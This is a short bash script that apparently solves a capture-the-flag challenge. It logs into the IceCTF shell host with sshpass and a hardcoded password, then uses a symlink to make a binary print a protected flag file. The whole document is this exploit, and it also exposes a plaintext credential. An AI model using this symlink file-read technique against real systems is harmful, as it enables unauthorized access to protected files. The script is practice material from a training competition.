#!/bin/bash
sshpass -p68IG7pOt ssh ctf-85132@shell.icec.tf -p 22 "ln -s /home/demo ~/icesh; echo "cat /home/demo/flag.txt" | ~/icesh "
